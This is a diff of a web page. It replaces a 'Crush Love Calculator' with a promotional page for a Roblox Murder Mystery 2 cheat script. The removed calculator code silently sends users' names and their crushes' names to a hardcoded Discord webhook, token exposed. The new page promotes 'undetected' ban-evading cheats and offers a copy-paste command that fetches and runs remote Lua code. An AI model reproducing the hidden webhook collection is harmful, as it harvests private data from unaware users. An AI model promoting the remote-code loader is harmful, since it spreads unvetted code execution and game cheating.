@@ -1,182 +1,246 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Crush Love Calculator</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Testol Hub | The Ultimate MM2 Script</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        body {
+        :root {
+            --primary: #00f2ff; /* Cyber Blue */
+            --secondary: #7000ff; /* Purple Accent */
+            --bg: #050505;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
             margin: 0;
-            font-family: "Poppins", sans-serif;
-            background: linear-gradient(135deg, #ff9bc1, #ffd1e3);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
-        #loadingScreen {
-            position: fixed;
+        body {
+            background-color: var(--bg);
+            color: white;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(112, 0, 255, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(0, 242, 255, 0.1) 0%, transparent 40%);
+        }
+
+        /* Navbar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2rem 10%;
+            backdrop-filter: blur(10px);
+            position: sticky;
             top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 203, 225, 0.95);
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            background: linear-gradient(90deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 100px 10% 50px;
+        }
+
+        .badge {
+            background: rgba(0, 242, 255, 0.1);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 1.5rem;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 8vw, 4.5rem);
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero p {
+            color: #a0a0a0;
+            max-width: 600px;
+            margin: 0 auto 2.5rem;
+            font-size: 1.1rem;
+        }
+
+        /* The Loadstring Box */
+        .loadstring-container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 8px;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
             align-items: center;
-            z-index: 999;
-            font-size: 24px;
-            font-weight: bold;
+            gap: 10px;
+            backdrop-filter: blur(12px);
         }
 
-        .loader {
-            border: 6px solid #ffe6f1;
-            border-top: 6px solid #ff4f9a;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
+        code {
+            flex-grow: 1;
+            text-align: left;
+            padding-left: 15px;
+            color: #888;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .copy-btn {
+            background: var(--primary);
+            color: black;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .copy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
+        }
+
+        /* Features Grid */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            padding: 80px 10%;
         }
 
         .card {
-            background: white;
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
             padding: 30px;
-            border-radius: 25px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-            width: 90%;
-            max-width: 360px;
-            text-align: center;
-            opacity: 0;
-            transform: scale(0.8);
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ffc3dd;
-            border-radius: 12px;
-            outline: none;
-            margin-bottom: 15px;
-            font-size: 16px;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 12px;
-            background: #ff4f9a;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        button:hover {
-            transform: scale(1.05);
-        }
-
-        .barContainer {
-            width: 100%;
-            background: #ffe6f1;
-            border-radius: 12px;
+            border-radius: 20px;
+            transition: 0.4s;
+            position: relative;
             overflow: hidden;
-            margin-top: 20px;
+        }
+
+        .card:hover {
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateY(-10px);
+        }
+
+        .card i {
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .card h3 {
+            margin-bottom: 12px;
+        }
+
+        .card p {
+            color: #888;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        /* Simple Toast Notification */
+        #toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--primary);
+            color: black;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
             display: none;
-        }
-        .barFill {
-            height: 20px;
-            width: 0%;
-            background: #ff4f9a;
-            transition: width 1.2s ease;
+            animation: slideUp 0.3s ease;
         }
 
-        #result {
-            margin-top: 15px;
-            font-size: 20px;
-            font-weight: bold;
-        }
-
-        @keyframes popIn {
-            to { opacity: 1; transform: scale(1); }
+        @keyframes slideUp {
+            from { transform: translateY(100px); }
+            to { transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
-<div id="loadingScreen">
-    <div class="loader"></div>
-    Loading Love Calculator...
-</div>
+    <nav>
+        <div class="logo">TESTOL HUB</div>
+        <div class="nav-links">
+            <a href="#" style="color: #888; text-decoration: none; font-size: 0.9rem;">Discord</a>
+        </div>
+    </nav>
 
-<div class="card" id="mainCard">
-    <h1>💕 Crush Love Calculator 💕</h1>
-    <input id="yourName" placeholder="Your Name" />
-    <input id="crushName" placeholder="Crush Name" />
-    <button onclick="calculateLove()">Calculate</button>
+    <section class="hero">
+        <div class="badge">Next-Gen MM2 Script</div>
+        <h1>Power Beyond <br><span style="color: var(--primary)">Imagination.</span></h1>
+        <p>Experience the most stable, undetected, and feature-rich script for Murder Mystery 2. Optimized for all major executors.</p>
 
-    <div class="barContainer" id="barContainer">
-        <div class="barFill" id="barFill"></div>
-    </div>
+        <div class="loadstring-container">
+            <i data-lucide="terminal" style="width:18px; margin-left: 10px; color: #555;"></i>
+            <code id="scriptText">loadstring(game:HttpGet("https://raw.githubusercontent.com/Testol/Main/main/Loader.lua"))()</code>
+            <button class="copy-btn" onclick="copyCode()">Copy</button>
+        </div>
+    </section>
 
-    <div id="result"></div>
-</div>
+    <section class="features">
+        <div class="card">
+            <i data-lucide="zap"></i>
+            <h3>Instant Auto-Farm</h3>
+            <p>The fastest coin collection system on the market. Max out your bag in seconds without being caught.</p>
+        </div>
+        <div class="card">
+            <i data-lucide="shield-check"></i>
+            <h3>Undetected</h3>
+            <p>Our bypass technology ensures you stay safe from bans while enjoying premium features.</p>
+        </div>
+        <div class="card">
+            <i data-lucide="eye"></i>
+            <h3>Full ESP</h3>
+            <p>Track the Murderer and Sheriff across the map with high-performance ESP and box outlines.</p>
+        </div>
+    </section>
 
-<script>
-const webhookURL = "https://discord.com/api/webhooks/1441796228634509455/qfLtwz-T6_PqdVw5qfKV9XkM1s3iCAXODQezmIA4pR276Hm5zN7sFEh-D3Bwb1Nth73R";
-    
-window.addEventListener('load', () => {
-    setTimeout(() => {
-        document.getElementById('loadingScreen').style.display = 'none';
-        const card = document.getElementById('mainCard');
-        card.style.animation = 'popIn 0.6s ease forwards';
-    }, 2000);
-});
+    <div id="toast">Copied to clipboard! 🚀</div>
 
-function calculateLove() {
-    const yourName = document.getElementById("yourName").value.trim();
-    const crushName = document.getElementById("crushName").value.trim();
-    const resultBox = document.getElementById("result");
-    const bar = document.getElementById("barFill");
-    const barContainer = document.getElementById("barContainer");
+    <script>
+        // Initialize Icons
+        lucide.createIcons();
 
-    if (!yourName || !crushName) {
-        resultBox.textContent = "Please enter both names!";
-        resultBox.style.color = "red";
-        return;
-    }
-
-    const lovePercent = Math.floor(Math.random() * 51) + 50;
-
-    barContainer.style.display = "block";
-    bar.style.width = "0%";
-
-    setTimeout(() => {
-        bar.style.width = lovePercent + "%";
-    }, 100);
-
-    setTimeout(() => {
-        resultBox.style.color = "black";
-        resultBox.textContent = `${crushName} likes you ${lovePercent}% ❤️`;
-    }, 1300);
-
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: `💘 **New Love Check** \n👤 Name: ${yourName} \n😍 Crush: ${crushName} \n📊 Result: ${lovePercent}%`
-        })
-    }).catch(err => console.log("Webhook Error:", err));
-}
-</script>
-
+        // Copy Function
+        function copyCode() {
+            const code = document.getElementById('scriptText').innerText;
+            navigator.clipboard.writeText(code);
+            
+            const toast = document.getElementById('toast');
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
